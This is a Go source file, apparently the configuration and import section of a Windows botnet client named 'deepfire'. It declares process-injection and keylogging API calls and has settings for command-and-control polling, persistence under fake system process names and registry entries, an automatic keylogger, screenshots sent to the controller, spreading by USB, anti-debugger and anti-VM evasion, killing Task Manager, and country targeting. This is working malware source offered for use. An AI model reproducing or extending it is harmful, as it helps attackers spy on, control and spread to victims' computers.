package deepfire

import (
	"os"
	"syscall"
)

const MEM_COMMIT = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010

var K32 = syscall.MustLoadDLL("kernel32.dll")  //kernel32.dll
var USER32 = syscall.MustLoadDLL("user32.dll") //user32.dll
var GetAsyncKeyState = USER32.MustFindProc("GetAsyncKeyState")
var VirtualAlloc = K32.MustFindProc("VirtualAlloc")
var CreateThread = K32.MustFindProc("CreateThread")
var WaitForSingleObject = K32.MustFindProc("WaitForSingleObject")
var VirtualAllocEx = K32.MustFindProc("VirtualAllocEx")
var CreateRemoteThread = K32.MustFindProc("CreateRemoteThread")
var GetLastError = K32.MustFindProc("GetLastError")
var WriteProcessMemory = K32.MustFindProc("WriteProcessMemory")
var OpenProcess = K32.MustFindProc("OpenProcess")
var IsDebuggerPresent = K32.MustFindProc("IsDebuggerPresent")

//============================================================
//       Be sure to Obfuscate important strings and data
//============================================================

var (
	//============================================================
	//                   Basic Variables
	//============================================================
	useSSL                bool   = true                                   //Use SSL Connections? Make sure the Panel URLS are https://
	sslInsecureSkipVerify bool   = true                                   //Use Insecure SSL Certs? AKA Self-signed (Not Recomended)
	userAgentKey          string = "d5900619da0c8a72e569e88027cd9490"     //Useragent for the panel to check to see if its a bot, change me to the one in the servers settings
	checkEveryMin         int    = 10                                     //Min Time (Seconds) to check for commands
	checkEveryMax         int    = 45                                     //Max Time (Seconds) to check for commands (Must be more then Min)
	instanceKey           string = "80202e73-067f-4b4c-93f8-d738d1f77f69" //
	installMe             bool   = true                                   //Should the bot install into system?
	installNames                 = [...]string{                           //Names for the Bot
		"svchost",
		"csrss",
		"rundll32",
		"winlogon",
		"smss",
		"taskhost",
		"unsecapp",
		"AdobeARM",
		"winsys",
		"jusched",
		"BCU",
		"wscntfy",
		"conhost",
		"csrss",
		"dwm",
		"sidebar",
		"ADService",
		"AppServices",
		"acrotray",
		"ctfmon",
		"lsass",
		"realsched",
		"spoolsv",
		"RTHDCPL",
		"RTDCPL",
		"MSASCui",
	}
	registryNames = [...]string{ //Registry Entrys for the Bot
		"Trion Softworks",
		"Mystic Entertainment",
		"Microsoft Partners",
		"Client-Server Runtime Subsystem",
		"Networking Service",
	}
	//============================================================
	//                   Optional Variables
	//============================================================
	clientVersion          string = "ArchDuke"                                                                                         //Bot Version
	antiDebug              bool   = false                                                                                              //Anti-Debug Programs
	debugReaction          int    = 1                                                                                                  // How to react to debug programs, 0 = Self Delete, 1 = Exit, 2 = Loop doing nothing
	activeDefense          bool   = true                                                                                               //Use Active defense
	watchdogName           string = "ServiceHelper"                                                                                    //Name of the WatchDog program
	antiProcess            bool   = false                                                                                              //Run Anti-Process on run
	autoScreenShot         bool   = true                                                                                               //Auto send a new Screen Shot to C&C
	autoScreenShotInterval int    = 15                                                                                                 //Minutes to wait between each SS
	sleepOnRun             bool   = false                                                                                              //Enable to sleep before loading config/starting
	sleepOnRunTime         int    = 5                                                                                                  //Seconds to sleep before starting (helps bypass AV)
	editHosts              bool   = false                                                                                              //Edit the HOST file on lounch to preset settings
	antiVirusBypass        bool   = false                                                                                              //Helps hide from Anti-Virus Programs
	procBlacklist          bool   = false                                                                                              //Process names to exit if detected
	autoKeylogger          bool   = true                                                                                               //Run keylogger automaticly on bot startup
	autoKeyloggerInterval  int    = 10                                                                                                 //Minutes to wait to send keylogs to C&C
	autoReverseProxy       bool   = false                                                                                              //To run the Reverse Proxy Server on startup
	reverseProxyPort       string = "8080"                                                                                             //Normal Port to run the server on
	reverseProxyBackend    string = "127.0.0.1:6060"                                                                                   //Backends to send proxyed data too. Supports Multi (127.0.0.1:8080,127.0.0.1:8181,....)
	startUpError           bool   = false                                                                                              //Shows an Error message on startup
	startUpErrorTitle      string = "Error"                                                                                            //Title of Error Message
	startUpErrorText       string = "This Programm is not a valid Win32 Application!"                                                  //Text of Error Message
	checkIP                       = [...]string{"http://checkip.amazonaws.com", "http://myip.dnsdynamic.org", "http://ip.dnsexit.com"} //$_SERVER['REMOTE_ADDR']
	maxMind                string = deobfuscate("iuuqt;00xxx/nbynjoe/dpn0hfpjq0w3/20djuz0nf")                                          //Gets IP information
	uTorrnetURL            string = "http://download.ap.bittorrent.com/track/stable/endpoint/utorrent/os/windows"                      //URL to download uTorrent from
	//	xmrMinerURL          string = "https://ottrbutt.com/cpuminer-multi/minerd-wolf-07-09-14.exe"                                                                 //URL to the Miner.exe
	tmpPath     string = os.Getenv("APPDATA") + "\\" //APPDATA err, Roaming
	winDirPath  string = os.Getenv("WINDIR") + "\\"  //Windows
	rawHTMLPage string = "404 page not found"        //What the defult HTML for hosting will say.
	//	binderMark           string = "-00800-"                                                                                                                      //To check if the files been infected by this bot
	driveNames     = [...]string{"A", "B", "D", "E", "F", "G", "H", "I", "J", "X", "Y", "Z"} //Drive Letters to Spread too, USB mainly.
	spreadNames    = [...]string{"USBDriver", "Installer", "Setup", "Install"}               //Names for the bot to spread under
	debugBlacklist = [...]string{                                                            //Debug Programs, Exit bot if detected
		"NETSTAT",
		"FILEMON",
		"PROCMON",
		"REGMON",
		"CAIN",
		"NETMON",
		"Tcpview",
		"vpcmap",
		"vmsrvc",
		"vmusrvc",
		"wireshark",
		"VBoxTray",
		"VBoxService",
		"IDA",
		"WPE PRO",
		"The Wireshark Network Analyzer",
		"WinDbg",
		"OllyDbg",
		"Colasoft Capsa",
		"Microsoft Network Monitor",
		"Fiddler",
		"SmartSniff",
		"Immunity Debugger",
		"Process Explorer",
		"PE Tools",
		"AQtime",
		"DS-5 Debug",
		"Dbxtool",
		"Topaz",
		"FusionDebug",
		"NetBeans",
		"Rational Purify",
		".NET Reflector",
		"Cheat Engine",
		"Sigma Engine",
	}
	processBlacklist  = [...]string{"msconfig", "autoruns", "taskmgr"} //Processes that Anti-Process will auto kill
	campaignWhitelist = [...]string{                                   //Countrys that the bot is allowed to install in
		"United States", "Canada", "China", "Netherlands", "Singapore",
		"United Kingdom", "Finland", "Russia", "Germany", "Israel",
		"South Korea", "Japan", "South Africa",
	}
	organizationBlacklist = [...]string{ //Organizations that do testing/Debugging/Anti-Virus work
		/*	"Amazon",
			"anonymous",
			"BitDefender",
			"BlackOakComputers",
			"Blue Coat",
			"BlueCoat",
			"Cisco",
			"cloud",
			"Data Center",
			"DataCenter",
			"DataCentre",
			"dedicated",
			"ESET, Spol",
			"FireEye",
			"ForcePoint",
			"Fortinet",
			"Hetzner",
			"hispeed.ch",
			"hosted",
			"Hosting",
			"Iron Port",
			"IronPort",
			"LeaseWeb",
			"MessageLabs",
			"Microsoft",
			"MimeCast",
			"NForce",
			"Ovh Sas",
			"Palo Alto",
			"ProofPoint",
			"Rackspace",
			"security",
			"Server",
			"Strong Technologies",
			"Trend Micro",
			"TrendMicro",
			"TrustWave",
			"VMVault",
			"Zscaler",*/
	}

	//============================================================
	//                   Dont Touch Bellow
	//============================================================
)

const (
	MB_OK                = 0x00000000
	MB_OKCANCEL          = 0x00000001
	MB_ABORTRETRYIGNORE  = 0x00000002
	MB_YESNOCANCEL       = 0x00000003
	MB_YESNO             = 0x00000004
	MB_RETRYCANCEL       = 0x00000005
	MB_CANCELTRYCONTINUE = 0x00000006
	MB_ICONHAND          = 0x00000010
	MB_ICONQUESTION      = 0x00000020
	MB_ICONEXCLAMATION   = 0x00000030
	MB_ICONASTERISK      = 0x00000040
	MB_USERICON          = 0x00000080
	MB_ICONWARNING       = MB_ICONEXCLAMATION
	MB_ICONERROR         = MB_ICONHAND
	MB_ICONINFORMATION   = MB_ICONASTERISK
	MB_ICONSTOP          = MB_ICONHAND

	MB_DEFBUTTON1 = 0x00000000
	MB_DEFBUTTON2 = 0x00000100
	MB_DEFBUTTON3 = 0x00000200
	MB_DEFBUTTON4 = 0x00000300

	ERROR_ALREADY_EXISTS = 183

// Virtual-Key Codes
)

type Win32_Process struct {
	Name           string
	ExecutablePath *string
}
type Win32_Product struct {
	Name *string
}
